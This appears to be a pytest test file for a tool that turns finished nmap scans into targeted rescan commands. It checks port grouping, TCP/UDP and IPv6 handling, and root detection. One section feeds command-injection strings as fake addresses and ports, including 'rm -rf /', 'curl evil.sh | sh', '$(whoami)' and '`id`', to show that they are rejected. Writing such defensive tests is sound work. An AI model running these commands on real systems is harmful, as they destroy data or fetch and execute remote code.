"""Turning a finished scan into the nmap command that scans only what it found.

The module is pure, so almost everything here is built from plain tuples of
``(address, protocol, port, state)`` rather than from a fixture file.
"""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from xnp import rescan

pytestmark = pytest.mark.usefixtures("quiet_logs")

SERVICE = "-sV -sC --version-all -Pn"


def one(targets, args=SERVICE, states=("open",)):
    """The single command a set of targets is expected to produce."""
    built = rescan.commands(targets, args, states)
    assert len(built) == 1
    return built[0].command


# --- Grouping ---------------------------------------------------------------

def test_hosts_with_the_same_ports_share_one_command():
    command = one([("10.0.0.5", "tcp", 22, "open"), ("10.0.0.5", "tcp", 80, "open"),
                   ("10.0.0.9", "tcp", 22, "open"), ("10.0.0.9", "tcp", 80, "open")])
    assert command.endswith("-p 22,80 10.0.0.5 10.0.0.9")


def test_a_different_port_set_gets_its_own_command():
    built = rescan.commands([("10.0.0.5", "tcp", 22, "open"),
                             ("10.0.0.9", "tcp", 22, "open"),
                             ("10.0.0.9", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 2
    assert {command.group.hosts for command in built} == {("10.0.0.5",), ("10.0.0.9",)}


def test_the_ports_come_out_sorted_and_deduplicated():
    command = one([("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "tcp", 22, "open"),
                   ("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "tcp", 80, "open")])
    assert "-p 22,80,443 " in command


def test_the_hosts_are_ordered_numerically_not_as_strings():
    command = one([("10.0.0.20", "tcp", 22, "open"), ("10.0.0.9", "tcp", 22, "open")])
    assert command.endswith("10.0.0.9 10.0.0.20")


def test_the_groups_are_ordered_by_how_many_hosts_they_carry():
    built = rescan.commands([("10.0.0.1", "tcp", 80, "open"),
                             ("10.0.0.2", "tcp", 22, "open"),
                             ("10.0.0.3", "tcp", 22, "open")], SERVICE, ("open",))
    assert [len(command.group.hosts) for command in built] == [2, 1]


def test_nothing_open_produces_no_commands():
    assert rescan.commands([("10.0.0.5", "tcp", 22, "closed")], SERVICE, ("open",)) == []


# --- Protocols --------------------------------------------------------------

def test_tcp_and_udp_land_in_one_command_with_the_t_and_u_syntax():
    command = one([("10.0.0.5", "tcp", 443, "open"), ("10.0.0.5", "udp", 53, "open")])
    assert "-p T:443,U:53 " in command


def test_a_udp_only_group_prefixes_its_ports():
    assert "-p U:161 " in one([("10.0.0.5", "udp", 161, "open")])


def test_a_mixed_group_also_carries_a_tcp_scan_type():
    # -sU with no TCP type makes nmap ignore the T: half of the spec.
    command = one([("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "udp", 53, "open")],
                  args="-A -Pn")
    assert "-sS" in command and "-sU" in command


def test_a_tcp_only_group_is_left_to_nmaps_own_default():
    # Adding -sS here would force sudo for no reason: nmap picks -sS as root
    # and -sT otherwise all by itself.
    command = one([("10.0.0.5", "tcp", 80, "open")], args="-sV -Pn")
    assert "-sS" not in command and "-sT" not in command


def test_a_udp_only_group_carries_no_tcp_scan_type():
    command = one([("10.0.0.5", "udp", 161, "open")], args="-sS -Pn -n --reason")
    assert "-sS" not in command and "-sU" in command


def test_a_tcp_only_group_never_carries_su():
    assert "-sU" not in one([("10.0.0.5", "tcp", 80, "open")], args="-sV -sU -Pn")


def test_a_connect_scan_in_the_profile_is_not_replaced_by_a_syn_scan():
    command = one([("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "udp", 53, "open")],
                  args="-sT -Pn")
    assert "-sT" in command and "-sS" not in command


def test_a_protocol_that_is_not_tcp_or_udp_is_not_a_port():
    assert rescan.commands([("10.0.0.5", "sctp", 80, "open")], SERVICE, ("open",)) == []


# --- Address families -------------------------------------------------------

def test_ipv6_hosts_never_share_a_command_with_ipv4():
    built = rescan.commands([("10.0.0.5", "tcp", 80, "open"),
                             ("2001:db8::1", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 2


def test_an_ipv6_group_carries_dash_six():
    assert "-6" in one([("2001:db8::1", "tcp", 80, "open")])


def test_a_profile_that_already_carries_dash_six_does_not_get_it_twice():
    command = one([("2001:db8::1", "tcp", 80, "open")], args="-sV -6 -Pn")
    assert command.split().count("-6") == 1


def test_dash_six_is_dropped_from_an_ipv4_command():
    command = one([("10.0.0.5", "tcp", 80, "open")], args="-sV -6 -Pn")
    assert "-6" not in command


# --- What the profile is not allowed to decide ------------------------------

@pytest.mark.parametrize("flag", ["-p-", "-p 80", "-p1-1000", "-F", "--top-ports 100",
                                  "--exclude-ports 22"])
def test_a_port_spec_in_the_profile_is_dropped(flag):
    command = one([("10.0.0.5", "tcp", 443, "open")], args=f"-sV {flag} -Pn")
    assert command.count("-p ") == 1
    assert command.endswith("-p 443 10.0.0.5")


@pytest.mark.parametrize("flag", ["-sn", "-sL", "-sP", "-sO"])
def test_a_scan_that_takes_no_port_list_is_dropped(flag):
    assert flag not in one([("10.0.0.5", "tcp", 443, "open")], args=f"-sV {flag} -Pn")


def test_only_what_actually_vanished_is_reported_as_dropped():
    # -sS is put back on a TCP group, so warning about it would be a lie.
    built = rescan.commands([("10.0.0.5", "tcp", 80, "open"),
                             ("10.0.0.5", "udp", 53, "open")], "-sS -p- -Pn", ("open",))
    assert built[0].dropped == ("-p-",)


def test_a_scan_type_the_group_had_no_use_for_is_reported_as_dropped():
    built = rescan.commands([("10.0.0.5", "udp", 161, "open")], "-sS -Pn", ("open",))
    assert built[0].dropped == ("-sS",)


# --- States -----------------------------------------------------------------

def test_only_the_configured_states_are_rescanned():
    targets = [("10.0.0.5", "tcp", 80, "open"), ("10.0.0.5", "tcp", 81, "closed"),
               ("10.0.0.5", "tcp", 82, "filtered")]
    assert one(targets, states=("open",)).endswith("-p 80 10.0.0.5")


def test_open_filtered_is_included_when_the_config_asks_for_it():
    targets = [("10.0.0.5", "udp", 161, "open|filtered")]
    assert rescan.commands(targets, SERVICE, ("open",)) == []
    assert "-p U:161 " in one(targets, states=("open", "open|filtered"))


# --- The command line is a shell, and the XML is not ours -------------------

@pytest.mark.parametrize("hostile", [
    "10.0.0.1; rm -rf /",
    "10.0.0.1 && curl evil.sh | sh",
    "$(whoami)",
    "`id`",
    "10.0.0.1\nnmap evil.example",
    "10.0.0.999",
    "",
])
def test_an_address_that_is_not_an_address_never_reaches_the_command_line(hostile):
    built = rescan.commands([(hostile, "tcp", 80, "open"),
                             ("10.0.0.5", "tcp", 80, "open")], SERVICE, ("open",))
    assert len(built) == 1
    assert built[0].command.endswith("-p 80 10.0.0.5")


def test_a_port_that_is_not_a_port_is_dropped():
    targets = [("10.0.0.5", "tcp", "80; id", "open"), ("10.0.0.5", "tcp", 99999, "open"),
               ("10.0.0.5", "tcp", 80, "open")]
    assert one(targets).endswith("-p 80 10.0.0.5")


def test_quoted_script_arguments_survive_the_round_trip():
    command = one([("10.0.0.5", "tcp", 80, "open")],
                  args="-sV --script 'vuln and safe' -Pn")
    assert "--script 'vuln and safe'" in command


# --- Privileges -------------------------------------------------------------

@pytest.mark.parametrize("command,expected", [
    ("nmap -sS -p 80 10.0.0.5", True),
    ("nmap -sU -p U:53 10.0.0.5", True),
    ("nmap -A -p 80 10.0.0.5", True),
    ("nmap -sT -sV -p 80 10.0.0.5", False),
    ("nmap -sV -sC -Pn -p 80 10.0.0.5", False),
])
def test_a_raw_socket_scan_is_reported_as_needing_root(command, expected):
    assert rescan.needs_root(command) is expected


# --- Address validation itself ----------------------------------------------

@pytest.mark.parametrize("address,family", [
    ("10.0.0.5", "ipv4"), ("255.255.255.255", "ipv4"),
    ("2001:db8::1", "ipv6"), ("::1", "ipv6"),
    ("256.0.0.1", ""), ("10.0.0", ""), ("lab.local", ""), ("10.0.0.1 ", ""),
])
def test_the_family_is_only_reported_for_a_real_address(address, family):
    assert rescan.address_family(address) == family


# --- The JavaScript port ----------------------------------------------------
#
# The report carries its own copy of these rules, because the reader clicks a
# button in a file that has no Python behind it.  Two implementations of the
# same thing drift; this runs both over the same input and diffs the output.

#: Every case is (nmap arguments, [(address, protocol, port)]).
SYNC_CASES = [
    ("-sV -sC --version-all -Pn", [("10.0.0.5", "tcp", 22), ("10.0.0.5", "tcp", 80),
                                   ("10.0.0.9", "tcp", 22), ("10.0.0.9", "tcp", 80)]),
    ("-sV -sC -Pn", [("10.0.0.3", "tcp", 443), ("10.0.0.3", "udp", 53),
                     ("10.0.0.20", "tcp", 5432)]),
    ("-A --script default,vuln -Pn", [("10.0.0.5", "tcp", 80), ("10.0.0.5", "udp", 53)]),
    ("-sS -Pn -n --reason", [("10.0.0.5", "udp", 161)]),
    ("-sT -Pn", [("10.0.0.5", "tcp", 80), ("10.0.0.5", "udp", 53)]),
    ("-sV -6 -p- -F --top-ports 100 -sn -Pn", [("2001:db8::1", "tcp", 80),
                                               ("10.0.0.5", "tcp", 80)]),
    ("-sV --script 'vuln and safe' -Pn", [("10.0.0.5", "tcp", 80)]),
    ("-sV -Pn", [("10.0.0.1; rm -rf /", "tcp", 80), ("$(id)", "tcp", 80),
                 ("10.0.0.999", "tcp", 80), ("10.0.0.20", "tcp", 80),
                 ("10.0.0.9", "tcp", 80)]),
    ("-sV -Pn", [("10.0.0.5", "tcp", 99999), ("10.0.0.5", "sctp", 80),
                 ("10.0.0.5", "tcp", 443)]),
]

HARNESS = """
var DATA = { rescan: null };
var state = { rescanProfile: "", rescanArgs: "" };
%s
JSON.parse(require("fs").readFileSync(0, "utf8")).forEach(function (testCase) {
  var rows = testCase.rows.map(function (r) {
    return { ip: r[0], protocol: r[1], num: r[2] };
  });
  signatureGroups(rows).forEach(function (group) {
    console.log(nmapCommand(group, testCase.args));
  });
});
"""


def javascript_block():
    """The report's port of this module, from its marker to the shape list."""
    source = (Path(rescan.__file__).parent / "data" / "report" / "report.js").read_text(
        encoding="utf-8")
    return source[source.index("  // --- Targeted rescan"):
                  source.index("  var TARGET_SHAPES = [")]


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_report_builds_the_same_commands_this_module_does(tmp_path):
    harness = tmp_path / "harness.js"
    harness.write_text(HARNESS % javascript_block(), encoding="utf-8")

    cases = [{"args": args, "rows": rows} for args, rows in SYNC_CASES]
    result = subprocess.run(["node", str(harness)], input=json.dumps(cases),
                            capture_output=True, text=True, check=True)

    expected = [command.command
                for args, rows in SYNC_CASES
                for command in rescan.commands(
                    [(address, protocol, port, "open") for address, protocol, port in rows],
                    args, ("open",))]
    assert result.stdout.splitlines() == expected
